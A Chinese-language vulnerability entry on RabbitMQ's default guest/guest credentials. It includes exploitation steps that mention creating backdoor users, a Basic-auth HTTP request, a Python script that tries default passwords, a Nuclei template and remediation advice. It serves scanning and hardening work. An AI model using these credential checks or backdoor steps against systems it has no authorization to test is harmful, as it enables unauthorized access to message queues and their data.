---
id: RABBITMQ-DEFAULT-CREDS
title: "RabbitMQ - 默认凭据 guest/guest 未授权访问"
product: rabbitmq
vendor: Broadcom/Pivotal
version_affected: "所有版本（3.3.0+需配置loopback_users=[]才可远程利用）"
severity: CRITICAL
tags: [default-credentials, unauthorized-access, weak-password, management]
fingerprint: ["RabbitMQ", "RabbitMQ Management"]
---

## 漏洞描述

RabbitMQ默认创建 `guest/guest` 管理员账户。虽然3.3.0+版本默认限制guest用户仅能从localhost登录，但许多部署通过配置 `loopback_users = []` 解除了此限制，导致远程可直接登录管理后台，完全控制消息队列。

## 影响版本

- RabbitMQ 所有版本（默认创建guest/guest账户）
- RabbitMQ < 3.3.0: guest用户默认可远程登录
- RabbitMQ >= 3.3.0: 需配置 `loopback_users = []` 解除localhost限制后可远程利用

## 利用步骤

1. 访问 `http://<target>:15672`，使用 `guest/guest` 登录管理后台
2. 或通过API检测: 发送带有Basic认证的请求到 `/api/overview`
3. 认证成功后获得管理员权限，可枚举用户、队列、读取消息、创建后门用户

## Payload

### 手动检测

**浏览器登录:** 访问 `http://<target>:15672`，使用 `guest/guest` 登录。

**API检测：**

```http
GET /api/overview HTTP/1.1
Host: <target>:15672
Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
```

`Authorization` 头为 `guest:guest` 的Base64编码。返回200且包含 `rabbitmq_version` 则凭据有效。

### Python检测脚本

```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_default_creds(target):
    """检测RabbitMQ默认凭据"""
    target = target.rstrip('/')
    creds = [
        ("guest", "guest"),
        ("admin", "admin"),
        ("rabbitmq", "rabbitmq"),
    ]
    for user, pwd in creds:
        try:
            r = requests.get(f"{target}/api/overview",
                           auth=(user, pwd), verify=False, timeout=10)
            if r.status_code == 200:
                data = r.json()
                version = data.get("rabbitmq_version", "unknown")
                print(f"[+] 默认凭据有效: {user}/{pwd}")
                print(f"[+] RabbitMQ版本: {version}")
                return (user, pwd, version)
        except Exception as e:
            print(f"[-] 请求失败: {e}")
            return None
    print(f"[-] 默认凭据无效")
    return None

# 使用: check_default_creds("http://target:15672")
```

### Nuclei模板

```yaml
id: rabbitmq-default-credentials

info:
  name: RabbitMQ Default Credentials
  author: security
  severity: critical
  description: RabbitMQ default guest credentials are accessible remotely

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/overview"
    headers:
      Authorization: "Basic Z3Vlc3Q6Z3Vlc3Q="

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "rabbitmq_version"
      - type: status
        status:
          - 200
```

## 修复建议

1. 修改或删除默认guest用户，创建使用强密码的管理员账户
2. 保持`loopback_users`默认配置（`[<<"guest">>]`），禁止guest用户远程登录
3. 定期审计用户列表，移除不必要的账户
4. 对管理端口(15672)实施网络访问控制
